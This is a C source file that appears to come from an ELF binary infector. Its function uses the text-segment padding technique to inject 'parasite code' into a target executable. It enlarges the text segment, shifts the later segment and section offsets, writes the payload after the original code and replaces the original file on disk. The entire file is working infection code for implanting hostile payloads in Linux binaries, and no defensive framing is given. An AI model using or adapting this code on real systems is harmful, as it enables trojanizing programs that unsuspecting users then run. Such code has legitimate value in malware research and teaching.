
#include "headers.h"

/* Text padding injection */
Elf64_Addr inject_elf(elf64_t *telf, uint8_t *pcode, size_t psize)
{
	Elf64_Addr paddr;
	Elf64_Off poff, tmpoff;

	int fd;
	size_t tmpsize;
	uint8_t *empty;
	char *shstrtab;

	shstrtab = &telf->mem[telf->shdr[telf->ehdr->e_shstrndx].sh_offset];
	printf("Searching text segment of target file...\n");
	paddr = 0;
	for (int i = 0; i < telf->ehdr->e_phnum; i++)
	{
		if (telf->phdr[i].p_type == PT_LOAD && !telf->phdr[i].p_offset)
		{
			printf("%s Text segment offset: 0x%08lx\n", GREEN("[+]"), telf->phdr[i].p_offset);
			printf("%s Text segment address: 0x%08lx\n", GREEN("[+]"), telf->phdr[i].p_vaddr);
			paddr = telf->phdr[i].p_vaddr + telf->phdr[i].p_memsz;
			poff = telf->phdr[i].p_offset + telf->phdr[i].p_filesz;
			tmpsize = telf->phdr[i].p_filesz;
			telf->phdr[i].p_filesz += psize;
			printf("%s Text segment file size: %ldByte --> %ldByte\n", GREEN("[+]"), tmpsize, telf->phdr[i].p_filesz);
			tmpsize = telf->phdr[i].p_memsz;
			telf->phdr[i].p_memsz += psize;
			printf("%s Text segment memory size: %ldByte --> %ldByte\n", GREEN("[+]"), tmpsize, telf->phdr[i].p_memsz);
			break;
		}
	}

	if (paddr == 0)
	{
		fprintf(stderr, "%s Text segment not found\n", RED("[-]"));
		return -1;									// -->
	}

	printf("Adjuting segments offset after text segment of the target file...\n");
	for (int i = 0; i < telf->ehdr->e_phnum; i++)
	{
		if (telf->phdr[i].p_offset >= poff)
		{
			tmpoff = telf->phdr[i].p_offset;
			telf->phdr[i].p_offset += PAGE_SIZE;
			printf("%s Segment %d offset: 0x%08lx --> 0x%08lx\n", \
				GREEN("[+]"), i, tmpoff, telf->phdr[i].p_offset);
		}
	}

	printf("Adjuting section offset after text segment of the target file...\n");
	for (int i = 0; i < telf->ehdr->e_shnum; i++)
	{
		if (telf->shdr[i].sh_offset >= poff)
		{
			tmpoff = telf->shdr[i].sh_offset;
			telf->shdr[i].sh_offset += PAGE_SIZE;
			printf("%s Section %s offset: 0x%08lx --> 0x%08lx\n", GREEN("[+]"), \
				&shstrtab[telf->shdr[i].sh_name], tmpoff, telf->shdr[i].sh_offset);
		}
		else if (telf->shdr[i].sh_addr + telf->shdr[i].sh_size == paddr)
		{
			tmpsize = telf->shdr[i].sh_size;
			telf->shdr[i].sh_size += psize;
			printf("%s Section %s size: %ldBytes --> %ldBytes\n", GREEN("[+]"), \
				&shstrtab[telf->shdr[i].sh_name], tmpsize, telf->shdr[i].sh_size);
		}
	}

	printf("Adjuting section header offset of the target file...\n");
	tmpoff = telf->ehdr->e_shoff;
	telf->ehdr->e_shoff += PAGE_SIZE;
	printf("%s Section header offset: 0x%08lx --> 0x%08lx\n", GREEN("[+]"), tmpoff, telf->ehdr->e_shoff);

	if ((fd = open(TMP_FILE, O_CREAT | O_WRONLY, telf->mode)) < 0)
	{
		fprintf(stderr, "[-] Open file %s failed\n", TMP_FILE);
		return -1;									// -->
	}

	if (!(empty = (uint8_t *)malloc(PAGE_SIZE - psize)))
	{
		perror("Malloc");
		return -1;									// -->
	}
	memset(empty, 0, PAGE_SIZE - psize);

	/* Inject the parasite code */
	if (write(fd, telf->mem, poff) != poff)
	{
		perror("Write mem");
		return -1;									// -->
	}

	if (write(fd, pcode, psize) != psize)
	{
		perror("Write pcode");
		return -1;									// -->
	}

	if (write(fd, empty, PAGE_SIZE - psize) != PAGE_SIZE - psize)
	{
		perror("Write empty");	
		return -1;									// -->
	}

	if (write(fd, telf->mem + poff, telf->size - poff) != telf->size - poff)
	{
		perror("Write mem + poff");
		return -1;									// -->
	}

	if (fsync(fd) < 0)
	{
		fprintf(stderr, "[-] Fsync file %s failed\n", TMP_FILE);
		return -1;									// -->
	}

	close(fd);
	free(empty);
	unload_elf(telf);
	unlink(telf->path);
	rename(TMP_FILE, telf->path);
	load_elf(telf->path, telf);

	return paddr;
}
